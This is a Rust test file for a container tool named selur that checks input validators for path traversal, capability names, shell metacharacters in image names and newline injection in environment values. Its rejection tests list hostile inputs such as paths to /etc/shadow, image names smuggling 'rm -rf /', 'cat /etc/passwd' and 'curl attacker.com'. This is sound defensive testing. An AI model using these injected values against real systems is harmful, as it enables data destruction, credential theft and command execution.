// SPDX-License-Identifier: PMPL-1.0-or-later
// SPDX-FileCopyrightText: 2026 Jonathan D.A. Jewell <6759885+hyperpolymath@users.noreply.github.com>
//
//! Aspect (cross-cutting concern) tests for selur.
//!
//! Tests security invariants, concurrency safety, and resilience under
//! adversarial or oversized inputs. These supplement unit and E2E tests by
//! covering non-functional requirements.

use selur::{Command, StatusCode};

// ---------------------------------------------------------------------------
// Security: namespace escape prevention
// ---------------------------------------------------------------------------

/// Determine whether a container path is safe (no traversal).
fn is_safe_container_path(path: &str) -> bool {
    // Reject paths that traverse upward via ".."
    if path.contains("..") {
        return false;
    }
    // Reject null bytes
    if path.contains('\0') {
        return false;
    }
    true
}

#[test]
fn aspect_security_path_traversal_rejected() {
    let traversal_attempts = [
        "../../etc/passwd",
        "../../../root/.ssh/authorized_keys",
        "/var/lib/../../etc/shadow",
        "./../../proc/1/cmdline",
        "/tmp/../../../etc/crontab",
    ];

    for path in &traversal_attempts {
        assert!(
            !is_safe_container_path(path),
            "traversal path '{}' must be rejected", path
        );
    }
}

#[test]
fn aspect_security_valid_paths_accepted() {
    let valid_paths = [
        "/var/lib/app/data",
        "/tmp/workdir",
        "/home/app",
        "/etc/app/config.json",
    ];

    for path in &valid_paths {
        assert!(
            is_safe_container_path(path),
            "valid path '{}' must be accepted", path
        );
    }
}

#[test]
fn aspect_security_null_byte_in_path_rejected() {
    assert!(
        !is_safe_container_path("/var/lib\x00malicious"),
        "path with null byte must be rejected"
    );
}

// ---------------------------------------------------------------------------
// Security: capability list injection
// ---------------------------------------------------------------------------

/// Known valid Linux capabilities.
const KNOWN_CAPABILITIES: &[&str] = &[
    "CAP_NET_ADMIN",
    "CAP_NET_BIND_SERVICE",
    "CAP_SYS_ADMIN",
    "CAP_CHOWN",
    "CAP_DAC_OVERRIDE",
    "CAP_SETUID",
    "CAP_SETGID",
    "CAP_KILL",
    "CAP_MKNOD",
    "CAP_NET_RAW",
    "CAP_SETPCAP",
    "CAP_SYS_CHROOT",
    "CAP_SYS_PTRACE",
    "CAP_AUDIT_WRITE",
];

fn is_known_capability(cap: &str) -> bool {
    KNOWN_CAPABILITIES.contains(&cap)
}

#[test]
fn aspect_security_unknown_capability_rejected() {
    let unknown_caps = [
        "CAP_FAKE_ESCALATION",
        "CAP_ALL",               // Not a real capability
        "CAP_EVERYTHING",
        "",                      // Empty string
        "NET_ADMIN",             // Missing CAP_ prefix
        "cap_net_admin",         // Lowercase (non-canonical)
        "CAP_NET_ADMIN\nCAP_SYS_ADMIN", // Injection attempt
    ];

    for cap in &unknown_caps {
        assert!(
            !is_known_capability(cap),
            "unknown capability '{}' must be rejected", cap
        );
    }
}

#[test]
fn aspect_security_known_capabilities_accepted() {
    for cap in KNOWN_CAPABILITIES {
        assert!(
            is_known_capability(cap),
            "known capability '{}' must be accepted", cap
        );
    }
}

// ---------------------------------------------------------------------------
// Security: image name shell metacharacter injection
// ---------------------------------------------------------------------------

fn is_safe_image_name(image: &str) -> bool {
    // Reject shell metacharacters that could cause command injection
    let forbidden: &[char] = &[
        ';', '|', '&', '$', '`', '(', ')', '{', '}', '<', '>',
        '\'', '"', '\\', '\n', '\r', '\t', '\0', '!', '*', '?',
    ];
    !image.chars().any(|c| forbidden.contains(&c))
        && !image.is_empty()
}

#[test]
fn aspect_security_image_name_injection_rejected() {
    let injections = [
        "nginx:latest; rm -rf /",
        "nginx | cat /etc/passwd",
        "$(whoami):latest",
        "`id`:alpine",
        "nginx:latest && curl attacker.com",
        "nginx:latest\necho pwned",
        "nginx:latest\0hidden",
    ];

    for image in &injections {
        assert!(
            !is_safe_image_name(image),
            "image name injection '{}' must be rejected", image
        );
    }
}

#[test]
fn aspect_security_valid_image_names_accepted() {
    let valid = [
        "nginx:1.27",
        "postgres:16-alpine",
        "ghcr.io/myorg/myapp:v2.0.0",
        "cgr.dev/chainguard/nginx:latest",
        "registry.example.com:5000/myimage:sha256-abc123",
        "myapp:latest",
    ];

    for image in &valid {
        assert!(
            is_safe_image_name(image),
            "valid image '{}' must be accepted", image
        );
    }
}

// ---------------------------------------------------------------------------
// Security: environment variable injection prevention
// ---------------------------------------------------------------------------

fn is_safe_env_value(value: &str) -> bool {
    // No null bytes — they terminate C strings and corrupt env
    if value.contains('\0') {
        return false;
    }
    // No newlines — HTTP header injection vector
    if value.contains('\n') || value.contains('\r') {
        return false;
    }
    true
}

#[test]
fn aspect_security_env_var_newline_injection_rejected() {
    let injections = [
        "value\nX-Injected: malicious",
        "value\r\nContent-Length: 0",
        "harmless\nmalicious",
        "value\x00hidden",
    ];

    for value in &injections {
        assert!(
            !is_safe_env_value(value),
            "env value injection '{}' must be rejected", value
        );
    }
}

#[test]
fn aspect_security_safe_env_values_accepted() {
    let safe_values = [
        "hello world",
        "postgres://user:pass@host:5432/db",
        "v2.0.0-beta.1",
        "some value with spaces and punctuation: yes!",
        "",   // empty value is valid
    ];

    for value in &safe_values {
        assert!(
            is_safe_env_value(value),
            "safe env value '{}' must be accepted", value
        );
    }
}

// ---------------------------------------------------------------------------
// Concurrency: concurrent protocol encoding doesn't corrupt state
// ---------------------------------------------------------------------------

#[test]
fn aspect_concurrency_parallel_request_encoding() {
    use std::sync::{Arc, Mutex};
    use std::thread;

    // Encode 100 requests across 4 threads; none must corrupt the others.
    let results: Arc<Mutex<Vec<(u8, Vec<u8>)>>> = Arc::new(Mutex::new(Vec::new()));

    let handles: Vec<_> = (0..4).map(|thread_id| {
        let results = Arc::clone(&results);
        thread::spawn(move || {
            for i in 0..25u32 {
                let cmd = Command::CreateContainer;
                let payload = format!("{{\"name\":\"t{}-c{}\"}}", thread_id, i);
                let payload_bytes = payload.as_bytes().to_vec();

                // Build packet (no shared mutable state — pure function)
                let mut packet = Vec::with_capacity(5 + payload_bytes.len());
                packet.push(cmd as u8);
                packet.extend_from_slice(&(payload_bytes.len() as u32).to_le_bytes());
                packet.extend_from_slice(&payload_bytes);

                // Decode and verify integrity
                assert_eq!(packet[0], 1u8, "cmd byte must be CreateContainer=1");
                let decoded_len = u32::from_le_bytes([packet[1], packet[2], packet[3], packet[4]]) as usize;
                assert_eq!(decoded_len, payload_bytes.len(), "length must match");
                assert_eq!(&packet[5..], payload_bytes.as_slice(), "payload must match");

                let mut guard = results.lock().expect("mutex must not be poisoned");
                guard.push((packet[0], payload_bytes));
            }
        })
    }).collect();

    for handle in handles {
        handle.join().expect("thread must complete without panic");
    }

    let guard = results.lock().expect("mutex must not be poisoned");
    assert_eq!(guard.len(), 100, "all 100 results must be recorded");
    // Verify all results have the correct command byte
    for (cmd_byte, _) in guard.iter() {
        assert_eq!(*cmd_byte, 1u8, "all results must be CreateContainer");
    }
}

// ---------------------------------------------------------------------------
// Resilience: oversized input handled gracefully
// ---------------------------------------------------------------------------

#[test]
fn aspect_resilience_oversized_config_does_not_panic() {
    // 1 MB config string — should not panic, just be encodable
    let large_payload = "x".repeat(1_024 * 1_024);

    // Encoding large input must succeed (no panic, no OOM in tests)
    let mut packet = Vec::with_capacity(5 + large_payload.len());
    packet.push(Command::CreateContainer as u8);
    packet.extend_from_slice(&(large_payload.len() as u32).to_le_bytes());
    packet.extend_from_slice(large_payload.as_bytes());

    // Validate encoding correctness
    assert_eq!(packet[0], Command::CreateContainer as u8);
    let decoded_len = u32::from_le_bytes([packet[1], packet[2], packet[3], packet[4]]) as usize;
    assert_eq!(decoded_len, large_payload.len(), "length field must match payload size");
    assert_eq!(packet.len(), 5 + large_payload.len(), "packet size must be correct");
}

#[test]
fn aspect_resilience_zero_length_payload_valid() {
    // Zero-length payload (e.g. ListContainers, which needs no body) must encode correctly
    let mut packet = Vec::with_capacity(5);
    packet.push(Command::ListContainers as u8);
    packet.extend_from_slice(&0u32.to_le_bytes());

    assert_eq!(packet.len(), 5, "zero-payload packet must be exactly 5 bytes");
    assert_eq!(packet[0], Command::ListContainers as u8);
    let decoded_len = u32::from_le_bytes([packet[1], packet[2], packet[3], packet[4]]);
    assert_eq!(decoded_len, 0, "zero payload length must round-trip");
}

#[test]
fn aspect_resilience_all_status_codes_have_display() {
    // All known status codes must have a non-empty Display impl
    for code in 0u8..=6u8 {
        let status = StatusCode::from_u8(code)
            .unwrap_or_else(|| panic!("status code {} must be known", code));
        let display = status.to_string();
        assert!(!display.is_empty(), "StatusCode {} display must not be empty", code);
    }
}
